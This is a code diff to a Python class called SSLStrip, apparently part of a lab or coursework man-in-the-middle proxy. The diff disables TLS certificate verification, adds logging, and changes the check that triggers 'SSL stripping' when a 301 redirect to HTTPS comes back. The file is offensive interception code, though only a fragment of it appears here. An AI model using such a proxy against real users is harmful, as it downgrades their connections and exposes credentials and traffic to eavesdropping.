@@ -81,11 +81,13 @@ class SSLStrip(object):
     @cherrypy.expose
     def index(self):
         # get content from server
-        r = requests.get(http(args.ipB))
+        r = requests.get(http(args.ipB), verify=False)
         url = r.url
 
+        log("Request made and returned status code: " +  str(r.status_code))
+
         # apply checks to figure out whether this is a 302 redirect for an http request
-        if (r.is_redirect and url[:5] == "https"):
+        if (r.status_code == 301):
             print "HTTPS redirect SSL stripping engaged"
 
             # Request https enabled content from Bob
@@ -105,6 +107,7 @@ class SSLStrip(object):
             return response.content
         else:
             # if it is not a redirect, then return whatever you have been given
+            log("Return page directly")
             return r.text
 
     @cherrypy.expose
